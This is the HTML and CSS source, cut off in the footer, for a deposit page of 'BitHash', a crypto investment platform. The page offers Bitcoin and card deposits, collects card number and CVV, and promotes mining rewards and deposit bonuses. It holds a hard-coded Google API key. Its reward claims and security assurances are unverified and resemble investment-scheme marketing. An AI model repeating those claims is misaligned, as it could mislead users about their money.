<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BitHash | Deposit Funds</title>
    <meta name="description" content="Securely deposit funds to your BitHash investment account using Bitcoin or Credit Card">
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Manrope:wght@500;600;700&display=swap" rel="stylesheet">
    
    <!-- Favicon -->
    <link rel="icon" href="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" type="image/png">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- AOS Animation -->
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
    
    <!-- Google Places API -->
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyB6Ty5ZHqoSA2jlyqnyi1c7HqLp6G8Ij7I&libraries=places"></script>
    
    <!-- QR Code Generator -->
    <script src="https://cdn.rawgit.com/davidshimjs/qrcodejs/gh-pages/qrcode.min.js"></script>
    
    <style>
        :root {
            --primary: #00D395;
            --primary-dark: #00A578;
            --primary-light: #00E5A1;
            --secondary: #1E1E1E;
            --secondary-dark: #121212;
            --dark: #FFFFFF;
            --darker: #0A0A0A;
            --light: #121212;
            --lighter: #1E1E1E;
            --gray: #8E8E8E;
            --gray-light: #2E2E2E;
            --gray-lighter: #252525;
            --success: #00D395;
            --warning: #FFB800;
            --error: #FF3D57;
            --gold: #F7931A;
            --gold-light: #FFD700;
            --gold-dark: #996515;
            --blue: #0066CC;
            --blue-dark: #004C99;
            --blue-light: #0077FF;
            --purple: #784FED;
            --pink: #EC4899;
            --gradient: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            --gold-gradient: linear-gradient(135deg, var(--gold) 0%, var(--gold-light) 100%);
            --blue-gradient: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
            --border-radius: 8px;
            --border-radius-lg: 12px;
            --box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --box-shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.2), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --transition-slow: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            --visa-blue: #1A1F71;
            --visa-gold: #F7B600;
            --mastercard-red: #EB001B;
            --mastercard-yellow: #F79E1B;
            --amex-blue: #006FCF;
            --discover-orange: #FF6000;
            --security-blue: #1A73E8;
            --security-green: #34A853;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html {
            scroll-behavior: smooth;
            overflow-x: hidden;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            color: var(--dark);
            background-color: var(--light);
            line-height: 1.6;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        /* Bitcoin Logo Animation */
        @keyframes bitcoinPulse {
            0% { transform: scale(1); opacity: 0.8; }
            50% { transform: scale(1.1); opacity: 1; filter: drop-shadow(0 0 10px var(--gold)); }
            100% { transform: scale(1); opacity: 0.8; }
        }

        .bitcoin-animation {
            display: inline-block;
            animation: bitcoinPulse 3s ease-in-out infinite;
            margin-right: 5px;
            vertical-align: middle;
            color: var(--gold);
            font-weight: bold;
        }

        /* Loading Overlay */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: var(--darker);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }
        
        .loading-overlay.hidden {
            opacity: 0;
            visibility: hidden;
        }
        
        .loading-logo {
            width: 80px;
            height: 80px;
            animation: pulse 1.5s infinite ease-in-out;
            filter: drop-shadow(0 0 10px rgba(0, 211, 149, 0.3));
        }
        
        .loading-text {
            margin-top: 20px;
            font-weight: 500;
            color: var(--gray);
            font-size: 1rem;
        }
        
        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0.8; }
            50% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(0.95); opacity: 0.8; }
        }
        
        .container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        /* Enterprise Header */
        header {
            background-color: var(--darker);
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
            padding: 10px 0;
            transition: var(--transition-slow);
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }
        
        .header-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            height: 100%;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            z-index: 1001;
        }
        
        .logo img {
            height: 32px;
            width: auto;
            transition: var(--transition);
        }
        
        .logo-text {
            font-weight: 700;
            font-size: 1.3rem;
            color: var(--primary);
            background: linear-gradient(90deg, var(--primary), var(--primary-light));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        /* User Balance */
        .user-balance {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: var(--darker);
            padding: 8px 16px;
            border-radius: var(--border-radius);
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.9rem;
            box-shadow: 0 4px 15px rgba(0, 211, 149, 0.3);
        }
        
        .user-balance:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 211, 149, 0.4);
        }
        
        /* Mobile Menu Toggle */
        .mobile-menu-toggle {
            display: none;
            background: none;
            border: none;
            color: var(--dark);
            font-size: 1.3rem;
            cursor: pointer;
            padding: 5px;
            z-index: 1001;
            transition: var(--transition);
        }
        
        nav {
            transition: var(--transition-slow);
        }
        
        nav ul {
            display: flex;
            list-style: none;
            gap: 25px;
        }
        
        nav a {
            text-decoration: none;
            color: var(--dark);
            font-weight: 500;
            transition: var(--transition);
            position: relative;
            font-size: 0.9rem;
            padding: 5px 0;
        }
        
        nav a:hover {
            color: var(--primary);
        }
        
        nav a::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 0;
            height: 2px;
            background: var(--primary);
            transition: var(--transition);
        }
        
        nav a:hover::after {
            width: 100%;
        }
        
        /* Buttons */
        .btn {
            padding: 12px 24px;
            border-radius: var(--border-radius);
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            border: none;
            font-size: 0.9rem;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            white-space: nowrap;
        }
        
        .btn-primary {
            background: var(--gradient);
            color: var(--darker);
            box-shadow: 0 4px 15px rgba(0, 211, 149, 0.3);
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 211, 149, 0.4);
        }
        
        .btn-outline {
            background-color: transparent;
            color: var(--primary);
            border: 1px solid var(--primary);
        }
        
        .btn-outline:hover {
            background: var(--primary);
            color: var(--darker);
        }
        
        /* Dashboard Section */
        .dashboard-section {
            padding: 100px 0 40px;
            background-color: var(--light);
        }
        
        .dashboard-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            flex-wrap: wrap;
            gap: 20px;
        }
        
        .dashboard-title h1 {
            font-size: 2rem;
            color: var(--dark);
            margin-bottom: 8px;
            font-weight: 700;
        }
        
        .dashboard-title p {
            color: var(--gray);
            font-size: 0.95rem;
        }
        
        .dashboard-actions {
            display: flex;
            gap: 15px;
        }
        
        /* Deposit Card */
        .deposit-card {
            background-color: var(--lighter);
            border-radius: var(--border-radius-lg);
            padding: 30px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
            border: 1px solid var(--gray-light);
        }
        
        .deposit-methods {
            display: flex;
            gap: 15px;
            margin-bottom: 25px;
            border-bottom: 1px solid var(--gray-light);
            padding-bottom: 20px;
        }
        
        .method-tab {
            padding: 12px 24px;
            border-radius: var(--border-radius);
            cursor: pointer;
            transition: var(--transition);
            font-weight: 600;
            border: 1px solid transparent;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .method-tab.active {
            background: var(--gradient);
            color: var(--darker);
            box-shadow: 0 4px 15px rgba(0, 211, 149, 0.2);
        }
        
        .method-tab:not(.active):hover {
            border-color: var(--primary);
            color: var(--primary);
        }
        
        .deposit-form-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }
        
        .deposit-form {
            background-color: var(--lighter);
            padding: 25px;
            border-radius: var(--border-radius-lg);
            border: 1px solid var(--gray-light);
        }
        
        /* Form Elements */
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 10px;
            font-size: 0.9rem;
            color: var(--gray);
            font-weight: 500;
        }
        
        .form-control {
            width: 100%;
            padding: 14px 16px;
            background-color: var(--secondary-dark);
            border: 1px solid var(--gray-light);
            border-radius: var(--border-radius);
            color: var(--dark);
            font-size: 0.95rem;
            transition: var(--transition);
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(0, 211, 149, 0.1);
        }
        
        /* Card Input */
        .card-input-container {
            position: relative;
        }
        
        .card-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.5rem;
        }
        
        .card-icon.visa {
            color: var(--visa-blue);
        }
        
        .card-icon.mastercard {
            color: var(--mastercard-red);
        }
        
        .card-icon.amex {
            color: var(--amex-blue);
        }
        
        .card-icon.discover {
            color: var(--discover-orange);
        }
        
        .card-icon.generic {
            color: var(--gray);
        }
        
        /* Bitcoin Deposit Form */
        .btc-qr-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 25px;
            background-color: var(--secondary-dark);
            border-radius: var(--border-radius-lg);
            border: 1px solid var(--gray-light);
            margin-bottom: 25px;
        }
        
        .btc-qr-code {
            width: 220px;
            height: 220px;
            background-color: white;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: var(--border-radius);
        }
        
        .btc-address {
            background-color: var(--secondary-dark);
            padding: 14px;
            border-radius: var(--border-radius);
            font-family: monospace;
            word-break: break-all;
            text-align: center;
            margin-bottom: 15px;
            position: relative;
            border: 1px solid var(--gray-light);
            font-size: 0.9rem;
        }
        
        .copy-address {
            position: absolute;
            right: 8px;
            top: 8px;
            background: var(--gradient);
            color: var(--darker);
            border: none;
            border-radius: 4px;
            padding: 4px 8px;
            font-size: 0.75rem;
            cursor: pointer;
            font-weight: 600;
        }
        
        /* Fee Calculator */
        .btc-fee-calculator {
            background-color: var(--secondary-dark);
            padding: 20px;
            border-radius: var(--border-radius-lg);
            margin-top: 20px;
            border: 1px solid var(--gray-light);
        }
        
        .btc-fee-title {
            font-size: 0.95rem;
            color: var(--dark);
            margin-bottom: 15px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .btc-fee-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 0.9rem;
        }
        
        .btc-fee-label {
            color: var(--gray);
        }
        
        .btc-fee-value {
            color: var(--dark);
            font-weight: 500;
        }
        
        .btc-fee-total {
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid var(--gray-light);
            font-weight: 600;
            color: var(--primary);
        }
        
        /* Deposit Summary */
        .deposit-summary {
            background-color: var(--secondary-dark);
            padding: 25px;
            border-radius: var(--border-radius-lg);
            border: 1px solid var(--gray-light);
            height: 100%;
        }
        
        .summary-title {
            font-size: 1.2rem;
            color: var(--dark);
            margin-bottom: 20px;
            font-weight: 600;
        }
        
        .summary-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--gray-light);
        }
        
        .summary-label {
            color: var(--gray);
            font-size: 0.9rem;
        }
        
        .summary-value {
            color: var(--dark);
            font-weight: 500;
        }
        
        .summary-total {
            font-weight: 700;
            color: var(--primary);
            font-size: 1.2rem;
            margin-top: 20px;
        }
        
        /* Disclaimers */
        .deposit-disclaimer {
            background-color: rgba(255, 61, 87, 0.1);
            padding: 18px;
            border-radius: var(--border-radius-lg);
            border-left: 4px solid var(--error);
            margin-top: 25px;
        }
        
        .disclaimer-title {
            color: var(--error);
            font-weight: 600;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .disclaimer-text {
            font-size: 0.85rem;
            color: var(--gray);
            line-height: 1.6;
        }
        
        .professional-disclaimer {
            background-color: rgba(247, 147, 26, 0.1);
            padding: 20px;
            border-radius: var(--border-radius-lg);
            border-left: 4px solid var(--gold);
            margin-top: 30px;
        }
        
        .professional-disclaimer-title {
            color: var(--gold);
            font-weight: 700;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .professional-disclaimer-text {
            font-size: 0.85rem;
            color: var(--gray);
            line-height: 1.6;
            margin-bottom: 15px;
        }
        
        .professional-disclaimer-list {
            padding-left: 20px;
            font-size: 0.85rem;
            color: var(--gray);
            line-height: 1.6;
            margin-bottom: 15px;
        }
        
        .professional-disclaimer-list li {
            margin-bottom: 8px;
            position: relative;
        }
        
        .professional-disclaimer-list li::before {
            content: '•';
            color: var(--gold);
            font-weight: bold;
            display: inline-block;
            width: 1em;
            margin-left: -1em;
        }
        
        /* Security Badge */
        .security-badge {
            position: fixed;
            bottom: 25px;
            right: 25px;
            background: var(--darker);
            padding: 14px 18px;
            border-radius: var(--border-radius-lg);
            box-shadow: var(--box-shadow-lg);
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 0.9rem;
            font-weight: 600;
            z-index: 100;
            border-left: 4px solid var(--security-green);
            color: var(--dark);
            border: 1px solid var(--gray-light);
            transition: var(--transition);
        }
        
        .security-badge:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(52, 168, 83, 0.3);
        }
        
        .security-badge i {
            color: var(--security-green);
            font-size: 1.1rem;
        }
        
        /* Notification System */
        .notification-center {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            pointer-events: none;
            width: 100%;
            max-width: 400px;
        }
        
        .notification {
            width: 100%;
            padding: 16px 20px;
            border-radius: var(--border-radius-lg);
            box-shadow: var(--box-shadow-lg);
            display: flex;
            align-items: center;
            gap: 12px;
            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            transform: translateX(100%);
            opacity: 0;
            margin-bottom: 10px;
            font-size: 0.9rem;
            font-weight: 500;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            pointer-events: auto;
            position: relative;
        }
        
        .notification.show {
            transform: translateX(0);
            opacity: 1;
        }
        
        .notification.error {
            background-color: rgba(255, 61, 87, 0.9);
            color: white;
        }
        
        .notification.success {
            background-color: rgba(0, 211, 149, 0.9);
            color: white;
        }
        
        .notification.warning {
            background-color: rgba(255, 184, 0, 0.9);
            color: var(--darker);
        }
        
        .notification.info {
            background-color: rgba(0, 102, 204, 0.9);
            color: white;
        }
        
        .notification i {
            font-size: 1.3rem;
            flex-shrink: 0;
        }
        
        .notification-content {
            flex: 1;
            padding-right: 10px;
        }
        
        .notification-title {
            font-weight: 600;
            margin-bottom: 4px;
            font-size: 1rem;
        }
        
        .notification-message {
            font-size: 0.9rem;
            line-height: 1.4;
        }
        
        .notification-close {
            position: absolute;
            top: 8px;
            right: 8px;
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background-color: rgba(0, 0, 0, 0.1);
            cursor: pointer;
            transition: var(--transition);
            font-size: 0.8rem;
        }
        
        .notification-close:hover {
            background-color: rgba(0, 0, 0, 0.2);
        }
        
        /* Footer */
        footer {
            background-color: var(--darker);
            color: white;
            padding: 60px 0 30px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .footer-container {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 40px;
            margin-bottom: 40px;
        }
        
        .footer-logo {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .footer-logo img {
            height: 30px;
            width: auto;
        }
        
        .footer-logo-text {
            font-weight: 700;
            font-size: 1.2rem;
            color: var(--primary);
        }
        
        .footer-about p {
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.9rem;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        
        .footer-social {
            display: flex;
            gap: 12px;
        }
        
        .social-icon {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: var(--transition);
            color: white;
            font-size: 0.9rem;
        }
        
        .social-icon:hover {
            transform: translateY(-3px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }
        
        .footer-title {
            font-weight: 700;
            margin-bottom: 20px;
            font-size: 1.1rem;
            color: white;
        }
        
        .footer-links ul {
            list-style: none;
        }
        
        .footer-links li {
            margin-bottom: 12px;
        }
        
        .footer-links a {
            color: rgba(255, 255, 255, 0.7);
            text-decoration: none;
            transition: var(--transition);
            font-size: 0.9rem;
            display: inline-block;
        }
        
        .footer-links a:hover {
            color: var(--primary);
            transform: translateX(3px);
        }
        
        .footer-contact p {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 15px;
            font-size: 0.9rem;
            line-height: 1.5;
        }
        
        .footer-contact i {
            color: var(--primary);
            width: 18px;
            text-align: center;
            margin-top: 3px;
        }
        
        .footer-bottom {
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            padding-top: 20px;
            text-align: center;
            color: rgba(255, 255, 255, 0.5);
            font-size: 0.8rem;
        }
        
        /* Responsive Styles */
        @media (max-width: 1200px) {
            .footer-container {
                gap: 30px;
            }
        }
        
        @media (max-width: 992px) {
            .deposit-form-container {
                grid-template-columns: 1fr;
            }
            
            .footer-container {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        
        @media (max-width: 768px) {
            .mobile-menu-toggle {
                display: block;
            }
            
            nav {
                position: fixed;
                top: 70px;
                left: 0;
                width: 100%;
                background-color: var(--darker);
                box-shadow: var(--box-shadow);
                padding: 20px;
                transform: translateY(-150%);
                opacity: 0;
                z-index: 999;
            }
            
            nav.active {
                transform: translateY(0);
                opacity: 1;
            }
            
            nav ul {
                flex-direction: column;
                gap: 15px;
                align-items: flex-start;
            }
            
            .deposit-methods {
                flex-wrap: wrap;
            }
            
            .method-tab {
                flex: 1;
                text-align: center;
            }
            
            .footer-container {
                grid-template-columns: 1fr;
                gap: 30px;
            }
            
            .security-badge {
                bottom: 15px;
                right: 15px;
                font-size: 0.8rem;
                padding: 10px 14px;
            }
        }
        
        @media (max-width: 576px) {
            .dashboard-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 15px;
            }
            
            .dashboard-title h1 {
                font-size: 1.6rem;
            }
            
            .dashboard-actions {
                width: 100%;
                flex-direction: column;
            }
            
            .dashboard-actions .btn {
                width: 100%;
            }
            
            .deposit-card {
                padding: 20px;
            }
            
            .footer-container {
                gap: 25px;
            }
            
            .notification-center {
                max-width: 90%;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loading-overlay">
        <img src="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" alt="BitHash Logo" class="loading-logo">    
        <div class="loading-text">Loading Deposit Information</div>
    </div>

    <!-- Security Badge -->
    <div class="security-badge">
        <i class="fas fa-shield-alt"></i>
        <span>256-bit AES & TLS 1.3 Encrypted</span>
    </div>

    <!-- Notification System -->
    <div class="notification-center" id="notification-center">
        <!-- Notifications will be dynamically inserted here -->
    </div>

    <!-- Header -->
    <header id="main-header">
        <div class="container header-container">
            <div class="logo" onclick="window.location.href='index.html'">
                <img src="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" alt="BitHash Logo">
                <span class="logo-text">BitHash</span>
            </div>
            
            <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle navigation">
                <i class="fas fa-bars"></i>
            </button>
            
            <nav id="main-nav">
                <ul>
                    <li><a href="index.html">Home</a></li>
                    <li><a href="index.html#plans">Investment Plans</a></li>
                    <li><a href="dashboard.html">Dashboard</a></li>
                    <li><a href="accountsetting.html">Settings</a></li>
                    <li><a href="index.html#contact">Contact</a></li>
                </ul>
            </nav>
            
            <div class="user-balance" id="user-balance" onclick="window.location.href='dashboard.html'">
                <i class="fas fa-wallet"></i>
                <span id="balance-amount">$0.00</span>
            </div>
        </div>
    </header>

    <!-- Deposit Section -->
    <section class="dashboard-section">
        <div class="container">
            <div class="dashboard-header">
                <div class="dashboard-title">
                    <h1>Deposit Funds</h1>
                    <p>Add funds to your investment account using secure payment methods</p>
                </div>
                <div class="dashboard-actions">
                    <button class="btn btn-outline" onclick="window.location.href='dashboard.html'">
                        <i class="fas fa-arrow-left"></i> Back to Dashboard
                    </button>
                </div>
            </div>
            
            <!-- Deposit Card -->
            <div class="deposit-card">
                <div class="deposit-methods">
                    <div class="method-tab active" data-method="btc" onclick="switchDepositMethod('btc')">
                        <i class="fab fa-bitcoin bitcoin-animation"></i> Bitcoin (BTC)
                    </div>
                    <div class="method-tab" data-method="card" onclick="switchDepositMethod('card')">
                        <i class="far fa-credit-card"></i> Credit/Debit Card
                    </div>
                </div>
                
                <div class="deposit-form-container">
                    <!-- Bitcoin Deposit Form -->
                    <div class="deposit-form" id="btc-deposit-form">
                        <div class="btc-qr-container">
                            <div id="btc-qr-code" class="btc-qr-code"></div>
                            <div class="btc-address" id="btc-address">
                                Loading Bitcoin address...
                                <button class="copy-address" onclick="copyBtcAddress()">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                            <p style="color: var(--gray); font-size: 0.85rem; text-align: center;">
                                Scan QR code or copy address above to deposit Bitcoin
                            </p>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Deposit Amount (USD)</label>
                            <input type="number" id="btc-amount" class="form-control" placeholder="Enter amount in USD" min="10" step="1">
                        </div>
                        
                        <!-- BTC Fee Calculator -->
                        <div class="btc-fee-calculator" id="btc-fee-calculator">
                            <div class="btc-fee-title">
                                <i class="fas fa-calculator"></i> Bitcoin Deposit Details
                            </div>
                            <div class="btc-fee-item">
                                <span class="btc-fee-label">Amount to Deposit:</span>
                                <span class="btc-fee-value" id="btc-deposit-amount">$0.00</span>
                            </div>
                            <div class="btc-fee-item">
                                <span class="btc-fee-label">Processing Fee (1%):</span>
                                <span class="btc-fee-value" id="btc-processing-fee">$0.00</span>
                            </div>
                            <div class="btc-fee-item">
                                <span class="btc-fee-label">Network Fee:</span>
                                <span class="btc-fee-value" id="btc-network-fee">$0.00</span>
                            </div>
                            <div class="btc-fee-item btc-fee-total">
                                <span class="btc-fee-label">Total BTC to Send:</span>
                                <span class="btc-fee-value" id="btc-total-amount">0.000000 BTC</span>
                            </div>
                        </div>
                        
                        <div class="deposit-disclaimer">
                            <div class="disclaimer-title">
                                <i class="fas fa-exclamation-circle"></i>
                                Important Notice
                            </div>
                            <div class="disclaimer-text">
                                Bitcoin deposits may take 10-30 minutes to confirm depending on network conditions. 
                                The amount credited will be based on the BTC/USD exchange rate at the time of confirmation. 
                                Do not send any other cryptocurrencies to this address as they will be lost.
                            </div>
                        </div>
                        
                        <!-- Professional Disclaimer -->
                        <div class="professional-disclaimer">
                            <div class="professional-disclaimer-title">
                                <i class="fas fa-gavel"></i> Legal & Risk Disclosure
                            </div>
                            <div class="professional-disclaimer-text">
                                Cryptocurrency investments involve substantial risk and are not suitable for all investors. 
                                The value of Bitcoin and other cryptocurrencies can be extremely volatile and you could lose 
                                your entire investment. Before making any deposit, please consider your investment objectives 
                                and level of experience.
                            </div>
                            <ul class="professional-disclaimer-list">
                                <li>BitHash is not a registered broker-dealer or investment adviser</li>
                                <li>Past performance is not indicative of future results</li>
                                <li>Crypto assets are not insured by any government agency</li>
                                <li>You are solely responsible for your investment decisions</li>
                            </ul>
                            <div class="professional-disclaimer-text">
                                By depositing funds, you acknowledge that you have read and understood these risks and 
                                agree to our <a href="#" style="color: var(--gold);">Terms of Service</a> and 
                                <a href="#" style="color: var(--gold);">Privacy Policy</a>.
                            </div>
                        </div>
                    </div>
                    
                    <!-- Card Deposit Form -->
                    <div class="deposit-form" id="card-deposit-form" style="display: none;">
                        <div class="form-group">
                            <label class="form-label">Deposit Amount (USD)</label>
                            <input type="number" id="card-amount" class="form-control" placeholder="Enter amount in USD" min="10" step="1">
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Card Number</label>
                            <div class="card-input-container">
                                <input type="text" id="card-number" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19">
                                <i class="fas fa-credit-card card-icon generic" id="card-type-icon"></i>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Cardholder Name</label>
                            <input type="text" id="card-name" class="form-control" placeholder="As shown on card">
                        </div>
                        
                        <div class="form-group" style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                            <div>
                                <label class="form-label">Expiry Date</label>
                                <input type="text" id="card-expiry" class="form-control" placeholder="MM/YY" maxlength="5">
                            </div>
                            <div>
                                <label class="form-label">CVV</label>
                                <input type="text" id="card-cvv" class="form-control" placeholder="123" maxlength="4">
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Billing Address</label>
                            <input type="text" id="billing-address" class="form-control" placeholder="Start typing your address">
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">Country</label>
                            <input type="text" id="billing-country" class="form-control" placeholder="Country" readonly>
                        </div>
                        
                        <div class="deposit-disclaimer">
                            <div class="disclaimer-title">
                                <i class="fas fa-exclamation-circle"></i>
                                Security Notice
                            </div>
                            <div class="disclaimer-text">
                                All card transactions are secured with 256-bit encryption. Your card details are processed 
                                directly by our payment processor and never stored on our servers. By proceeding, you agree 
                                to our Terms of Service and Privacy Policy.
                            </div>
                        </div>
                        
                        <button class="btn btn-primary" style="width: 100%; margin-top: 15px;" onclick="processCardDeposit()">
                            <i class="fas fa-lock"></i> Secure Deposit
                        </button>
                    </div>
                    
                    <!-- Deposit Summary -->
                    <div class="deposit-summary">
                        <div class="summary-title">Deposit Summary</div>
                        
                        <div class="summary-item">
                            <span class="summary-label">Selected Method:</span>
                            <span class="summary-value" id="summary-method">Bitcoin (BTC)</span>
                        </div>
                        
                        <div class="summary-item">
                            <span class="summary-label">Amount:</span>
                            <span class="summary-value" id="summary-amount">$0.00</span>
                        </div>
                        
                        <div class="summary-item">
                            <span class="summary-label">Processing Fee:</span>
                            <span class="summary-value" id="summary-fee">$0.00</span>
                        </div>
                        
                        <div class="summary-item">
                            <span class="summary-label">Estimated BTC:</span>
                            <span class="summary-value" id="summary-btc">0.000000 BTC</span>
                        </div>
                        
                        <div class="summary-item" style="border-bottom: none; padding-bottom: 0;">
                            <span class="summary-label">Total to Credit:</span>
                            <span class="summary-value" id="summary-total">$0.00</span>
                        </div>
                        
                        <div class="summary-total">
                            <span id="summary-total-label">Total: $0.00</span>
                        </div>
                        
                        <div class="deposit-disclaimer" style="margin-top: 25px; background-color: rgba(0, 211, 149, 0.1); border-left-color: var(--primary);">
                            <div class="disclaimer-title" style="color: var(--primary);">
                                <i class="fas fa-info-circle"></i>
                                Deposit Benefits
                            </div>
                            <div class="disclaimer-text">
                                All deposits are eligible for our daily mining rewards program. 
                                Deposits over $1,000 receive a 5% bonus credited immediately.
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="footer-container">
                <div class="footer-about">
                    <div class="footer-logo">
                        <img src="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" alt="BitHash Logo">
                        <span class="footer-logo-text">BitHash</span>
                    </div>
                    <p>Enterprise-grade Bitcoin investment platform with institutional-level security and transparent operations.</p>
                    <div class="footer-social">
                        <a href="https://twitter.com/bithash" class="social-icon twitter" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
                        <a href="https://linkedin.com/company/bithash" class="social-icon linkedin" aria-label="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
                        <a href="https://facebook.com/bithash" class="social-icon facebook" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
                        <a href="https://instagram.com/bithash" class="social-icon instagram" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
                    </div>
                </div>
                
                <div class="footer-links">
                    <h3 class="footer-title">Platform</h3>
                    <ul>
                        <li><a href="dashboard.html">Dashboard</a></li>
                        <li><a href="index.html#plans">Investment Plans</a></li>
                        <li><a href="index.html#loans">Loans & Savings</a></li>
                        <li><a href="accountsetting.html">My Account</a></li>
                        <li><a href="rewards.html">Rewards</a></li>
                    </ul>
                </div>
                
                <div class="footer-links">
                    <h3 class="footer-title">Company</h3>
                    <ul>
                        <li><a href="about.html">About Us</a></li>
                        <li><a href="careers.html">Careers</a></li>
